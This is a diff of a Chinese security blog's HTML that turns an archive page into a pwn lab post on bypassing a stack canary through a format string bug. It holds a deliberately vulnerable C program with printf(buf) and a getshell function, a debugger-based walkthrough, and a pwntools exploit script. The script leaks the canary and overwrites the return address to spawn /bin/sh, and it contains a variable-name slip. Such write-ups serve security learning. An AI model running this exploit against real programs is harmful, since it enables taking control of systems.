@@ -6,15 +6,27 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>Archives | 怪咖的小屋</title>
+  <title>怪咖的小屋</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
+  <meta name="description" content="Canary绕过(格式化字符串利用) Canary绕过(格式化字符串利用)漏洞代码:#include &amp;lt;stdio.h&amp;gt; #include &amp;lt;unistd.h&amp;gt; #include &amp;lt;string.h&amp;gt;void  getshell(void) {system(“/bin/sh”);}void  init() {setbuf(stdin,  NULL);setbuf">
+<meta property="og:type" content="article">
 <meta property="og:title" content="怪咖的小屋">
-<meta property="og:url" content="http://yoursite.com/archives/index.html">
+<meta property="og:url" content="http://yoursite.com/2019/09/10/PWN/Canary绕过(格式化字符串利用)/index.html">
 <meta property="og:site_name" content="怪咖的小屋">
+<meta property="og:description" content="Canary绕过(格式化字符串利用) Canary绕过(格式化字符串利用)漏洞代码:#include &amp;lt;stdio.h&amp;gt; #include &amp;lt;unistd.h&amp;gt; #include &amp;lt;string.h&amp;gt;void  getshell(void) {system(“/bin/sh”);}void  init() {setbuf(stdin,  NULL);setbuf">
 <meta property="og:locale" content="zh">
+<meta property="og:image" content="http://yoursite.com/2019/09/10/PWN/Canary绕过(格式化字符串利用)/_resources/183de8fcd52b9b29d4fd53fa7fd67590.png">
+<meta property="og:image" content="http://yoursite.com/2019/09/10/PWN/Canary绕过(格式化字符串利用)/_resources/1f9ac97d03e5f8da123832a1faca2f84.png">
+<meta property="og:image" content="http://yoursite.com/2019/09/10/PWN/Canary绕过(格式化字符串利用)/_resources/f06e293b9d77341a1e5af0033b7df246.png">
+<meta property="og:image" content="http://yoursite.com/2019/09/10/PWN/Canary绕过(格式化字符串利用)/_resources/a071431c124bace0697ab210d7b66ab0.png">
+<meta property="og:image" content="http://yoursite.com/2019/09/10/PWN/Canary绕过(格式化字符串利用)/_resources/b7b8e1c128f9b8f531aef4de99ec0186.png">
+<meta property="og:image" content="http://yoursite.com/2019/09/10/PWN/Canary绕过(格式化字符串利用)/_resources/f06e293b9d77341a1e5af0033b7df246.png">
+<meta property="og:image" content="http://yoursite.com/2019/09/10/PWN/Canary绕过(格式化字符串利用)/_resources/75dbb4fe9594be97c4d081af6151fe72.png">
+<meta property="og:updated_time" content="2019-09-10T08:58:12.479Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="怪咖的小屋">
+<meta name="twitter:description" content="Canary绕过(格式化字符串利用) Canary绕过(格式化字符串利用)漏洞代码:#include &amp;lt;stdio.h&amp;gt; #include &amp;lt;unistd.h&amp;gt; #include &amp;lt;string.h&amp;gt;void  getshell(void) {system(“/bin/sh”);}void  init() {setbuf(stdin,  NULL);setbuf">
+<meta name="twitter:image" content="http://yoursite.com/2019/09/10/PWN/Canary绕过(格式化字符串利用)/_resources/183de8fcd52b9b29d4fd53fa7fd67590.png">
   
     <link rel="alternative" href="/atom.xml" title="怪咖的小屋" type="application/atom+xml">
   
@@ -146,235 +158,171 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-PWN/Canary绕过(格式化字符串利用)" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>Canary绕过(格式化字符串利用)</p>
+<h2 id="Canary绕过-格式化字符串利用"><a href="#Canary绕过-格式化字符串利用" class="headerlink" title="Canary绕过(格式化字符串利用)"></a><strong>Canary绕过(格式化字符串利用)</strong></h2><h3 id="漏洞代码"><a href="#漏洞代码" class="headerlink" title="漏洞代码:"></a><strong>漏洞代码:</strong></h3><p>#include &lt;stdio.h&gt;</p>
+<p>#include &lt;unistd.h&gt;</p>
+<p>#include &lt;string.h&gt;<br>void  getshell(void) {<br>system(“/bin/sh”);<br>}<br>void  init() {<br>setbuf(stdin,  NULL);<br>setbuf(stdout,  NULL);<br>setbuf(stderr,  NULL);<br>}<br>int  main(void) {<br>int  i;<br>init();<br>char  buf[100];<br>for(int  i=0;i&lt;2;i++){<br>scanf(“%s”,&amp;buf);<br>printf(buf);  //vul<br>}<br>return  0;<br>}</p>
+<h3 id="原理："><a href="#原理：" class="headerlink" title="原理："></a><strong>原理：</strong></h3><p>利用格式化字符串漏洞泄露出canary的值，利用main函数的ret拿到shell</p>
+<h3 id="具体实现："><a href="#具体实现：" class="headerlink" title="具体实现："></a><strong>具体实现：</strong></h3><h4 id="找到canary的位置："><a href="#找到canary的位置：" class="headerlink" title="找到canary的位置："></a><strong>找到canary的位置：</strong></h4><p><img src="/2019/09/10/PWN/Canary绕过(格式化字符串利用)/_resources/183de8fcd52b9b29d4fd53fa7fd67590.png" alt><br>在进入main函数后将canary的值储存在$ebp - 0xc的地方<img src="/2019/09/10/PWN/Canary绕过(格式化字符串利用)/_resources/1f9ac97d03e5f8da123832a1faca2f84.png" alt></p>
+<h4 id="找到存储字符串的地址："><a href="#找到存储字符串的地址：" class="headerlink" title="找到存储字符串的地址："></a><strong>找到存储字符串的地址：</strong></h4><p><img src="/2019/09/10/PWN/Canary绕过(格式化字符串利用)/_resources/f06e293b9d77341a1e5af0033b7df246.png" alt></p>
+<h4 id="计算偏移："><a href="#计算偏移：" class="headerlink" title="计算偏移："></a><strong>计算偏移：</strong></h4><p>(0x37c - 0x304) / 4 = 30 所以canary在偏移31的地方</p>
+<h4 id="找到main函数的ret地址"><a href="#找到main函数的ret地址" class="headerlink" title="找到main函数的ret地址:"></a><strong>找到main函数的ret地址:</strong></h4><p><img src="/2019/09/10/PWN/Canary绕过(格式化字符串利用)/_resources/a071431c124bace0697ab210d7b66ab0.png" alt><br>这段代码需要注意下：因为eip指向ret时，esp的值就是ret的地址。<br>那么代码的执行效果如下：<br>pop ecx后，ecx = 0xbffff3a0<br>pop ebx后，ebx = 0x0<br>pop ebp后，ebp = 0x0</p>
+<p>lea esp,[ecx-0x4]后，esp = *(ecx - 0x4) = *(0xbffff3a0 - 0x4) = *(0xbffff39c) = 0xb7df1e81</p>
+<p>如下：<br><img src="/2019/09/10/PWN/Canary绕过(格式化字符串利用)/_resources/b7b8e1c128f9b8f531aef4de99ec0186.png" alt><br>那么将下面的图补充完整：<br><img src="/2019/09/10/PWN/Canary绕过(格式化字符串利用)/_resources/f06e293b9d77341a1e5af0033b7df246.png" alt><br>0xbffff380存储了之后将要pop出的ecx的值<br>那么需要在这里伪造出getshell的地址 + 4，那么之后pop ecx, esp = *(&amp;getshell + 4 - 4) = getshell</p>
+<h3 id="代码如下："><a href="#代码如下：" class="headerlink" title="代码如下："></a><strong>代码如下：</strong></h3><p>from  pwn  import  *</p>
+<p>s  =  process(‘./cannry’)<br>libc  =  ELF(‘./cannry’)</p>
+<p>#context.terminal = [‘gnome-terminal’,’-x’,’sh’,’-c’]</p>
+<p>#gdb.attach(proc.pidof(s)[0])<br>shell_addr  =  libc.symbols[‘getshell’]<br>payload  =  ‘%31$x,%x’<br>s.sendline(payload)<br>res  =  s.recv()<br>cannry_addr  =  int(res.split(‘,’)[0],16)<br>arr_addr  =  int(res.split(‘,’)[1],16)  +  4<br>print  ‘cannry_addr is : ‘  +  hex(cannry_addr)<br>print  ‘arr_addr is : ‘  +  hex(arr_addr)</p>
+<p>payload  =  p32(shell_addr)  +  ‘a’  *  96  +  p32(cannry_addr)  +  p32(arr_shell)</p>
+<p>print  ‘[*] payload is : ‘  +  payload<br>s.sendline(payload)<br>s.interactive()</p>
+<p><img src="/2019/09/10/PWN/Canary绕过(格式化字符串利用)/_resources/75dbb4fe9594be97c4d081af6151fe72.png" alt></p>
+
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>感觉还不错的话就嘿嘿嘿吧<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    <div class="reward-box-item">
+                      <img class="reward-img" src="/assets/img/alipay.jpg">
+                      <span class="reward-type">支付宝</span>
+                    </div>
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
       
       
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2019" class="archive-year">2019</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/09/10/Reverse/输入表重建工具ImportREC/" class="archive-article-date">
-  	<time datetime="2019-09-10T08:58:12.709Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-10</time>
-</a>
-        </div>
-    	 
-        <div class="article-info info-on-right">
-          
-          
+      
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2019/09/10/PWN/Canary绕过(格式化字符串利用)/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/09/10/Python/Python网络编程/" class="archive-article-date">
-  	<time datetime="2019-09-10T08:58:12.693Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-10</time>
-</a>
-        </div>
-    	 
-        <div class="article-info info-on-right">
-          
-          
 
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/09/10/Python/Python字符串开头b r u含义/" class="archive-article-date">
-  	<time datetime="2019-09-10T08:58:12.677Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-10</time>
-</a>
-        </div>
-    	 
-        <div class="article-info info-on-right">
-          
-          
+<nav id="article-nav">
+  
+    <a href="/2019/09/10/PWN/简单栈溢出/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2019/09/10/PWN/ROP之ret2dlresolve/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title"></div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
 
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/09/10/Python/Pythonpexpect/" class="archive-article-date">
-  	<time datetime="2019-09-10T08:58:12.660Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-10</time>
-</a>
-        </div>
-    	 
-        <div class="article-info info-on-right">
-          
-          
 
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/09/10/Python/Python z3-solver/" class="archive-article-date">
-  	<time datetime="2019-09-10T08:58:12.643Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-10</time>
-</a>
-        </div>
-    	 
-        <div class="article-info info-on-right">
-          
-          
+        
+        
+    </div>
+</aside>
 
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/09/10/Python/Python binascii模块/" class="archive-article-date">
-  	<time datetime="2019-09-10T08:58:12.627Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-10</time>
-</a>
-        </div>
-    	 
-        <div class="article-info info-on-right">
-          
-          
 
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/09/10/Python/PythonPIL简单编程/" class="archive-article-date">
-  	<time datetime="2019-09-10T08:58:12.609Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-10</time>
-</a>
-        </div>
-    	 
-        <div class="article-info info-on-right">
-          
-          
 
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/09/10/Python/PythonHash/" class="archive-article-date">
-  	<time datetime="2019-09-10T08:58:12.592Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-10</time>
-</a>
-        </div>
-    	 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/09/10/Python/Python 邮件编程/" class="archive-article-date">
-  	<time datetime="2019-09-10T08:58:12.575Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-10</time>
-</a>
-        </div>
-    	 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/09/10/PWN/格式化字符串漏洞利用/" class="archive-article-date">
-  	<time datetime="2019-09-10T08:58:12.559Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-10</time>
-</a>
-        </div>
-    	 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
   
   
-    </div></section>
   
 
-    
-    <nav id="page-nav">
-      <span class="page-number current">1</span><a class="page-number" href="/archives/page/2/">2</a><a class="extend next" rel="next" href="/archives/page/2/">Next &raquo;</a>
-    </nav>
+  
+
+  
+
   
 
 
@@ -398,8 +346,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
